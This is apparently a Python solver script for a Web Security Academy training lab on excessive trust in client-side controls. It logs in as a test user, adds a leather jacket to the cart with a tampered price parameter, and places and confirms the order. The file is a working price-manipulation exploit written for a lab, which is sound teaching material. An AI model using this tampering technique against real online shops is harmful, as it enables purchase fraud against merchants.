################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 25/10/2023
#
# Lab: Excessive trust in client-side controls
#
# Steps: 1. fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Login as wiener
#        4. Add the leather jacket to the cart with a modified price
#        5. Fetch wiener's cart
#        6. Extract the csrf token needed for placing order
#        7. Place order
#        8. Confirm order
#
################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a4e00240418f57e84c16df600ac00c6.web-security-academy.net"

try:  
    # fetch the login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

# data to send via POST
data = {
    "productId": "1",
    "redir": "PRODUCT",
    "quantity": "1",
    "price": "1000",
}

try:  
    # add the leather jacket to the cart with a modified price
    wiener = requests.post(f"{url}/cart", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to add the leather jacket to the cart with a modified price through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Adding the leather jacket to the cart with a modified price.. " + Fore.GREEN + "OK")

try:  
    # fetch wiener's cart
    wiener = requests.get(f"{url}/cart", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
    exit(1)

print(Fore.WHITE + "⦗5⦘ Fetching wiener's cart.. " + Fore.GREEN + "OK")

# extract the csrf token needed for placing order
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]

print(Fore.WHITE + "⦗6⦘ Extracting the csrf token needed for placing order.. " + Fore.GREEN + "OK")

# data to send via POST
data = {
    "csrf": csrf
}

try:  
    # place order
    wiener = requests.post(f"{url}/cart/checkout", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to place order through exception")
    exit(1)

print(Fore.WHITE + "⦗7⦘ Placing order.. " + Fore.GREEN + "OK")

try:  
    # confirm order to mark the lab as solved.
    # without this request the leather jacket will be purchased
    # and your credit will be decreased but the lab will sill be unsolved
    wiener = requests.get(f"{url}/cart/order-confirmation?order-confirmed=true", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener's cart through exception")
    exit(1)

print(Fore.WHITE + "⦗8⦘ Confirming order.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


